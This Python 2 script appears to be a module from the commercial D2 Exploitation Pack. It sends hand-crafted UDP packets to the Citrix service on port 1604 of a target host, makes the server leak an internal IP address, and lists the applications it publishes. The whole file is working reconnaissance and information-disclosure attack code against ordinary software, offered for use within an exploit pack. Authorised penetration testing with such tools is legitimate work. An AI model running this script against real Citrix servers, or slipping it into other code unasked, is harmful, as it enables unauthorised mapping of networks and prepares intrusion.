#
# Proprietary D2 Exploitation Pack source code - use only under the license 
# agreement specified in LICENSE.txt in your D2 Exploitation Pack
#
# Copyright DSquare Security, LLC, 2007-2011
#

import sys, socket

trick_master  = "\x20\x00\x01\x30\x02\xFD\xA8\xE3";
trick_master += "\x00\x00\x00\x00\x00\x00\x00\x00";
trick_master += "\x00\x00\x00\x00\x00\x00\x00\x00";
trick_master += "\x00\x00\x00\x00\x00\x00\x00\x00";

get_pa  = "\x2a\x00\x01\x32\x02\xfd";
get_pa += "\xa8\xe3\x00\x00\x00\x00";
get_pa += "\x00\x00\x00\x00\x00\x00";
get_pa += "\x00\x00\x00\x00\x00\x00";
get_pa += "\x00\x00\x00\x00\x21\x00";
get_pa += "\x02\x00\x00\x00\x00\x00";
get_pa += "\x00\x00\x00\x00\x00\x00";

def app_enum(host):
  nfo = []
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.settimeout(30)
  try:
    s.connect((host, 1604))
  except socket.error, e:
    nfo.append('Connection refused: %s' % e[1])
    return nfo 
  # 1. Leak an IP
  try:
    s.send(trick_master)
    data = s.recv(1500)
    ip = data[data.find('\x02\x00\x06\x44')+4:data.find('\x02\x00\x06\x44')+8]
    ip_str = ''.join(map(lambda x: str(ord(x))+'.',list(ip)))[:-1]
    nfo.append('IP was leaked through Citrix service : %s\n\n' % ip_str)
  except Exception, e:
    nfo.append('[D2] Citrix - Leak an IP via %s : %s' % (host,e))
  # 2. Enum Citrix applications
  try:
    s.send(get_pa)
    data = s.recv(1500)
    application = data[40:].split('\x00')[:-1]
    nfo.append('Citrix exports the following applications:\n')
    nfo.append(''.join(map(lambda x: '\t- '+x+'\n',application)))
  except Exception,e:
    nfo.append('[D2] Citrix - Enum Citrix applications via %s : %s' % (host,e))
  return nfo

if __name__ == "__main__":
  try:
    host = sys.argv[1]
  except:
    print "%s host" % sys.argv[0]
    sys.exit(-1)
  print app_enum(host)

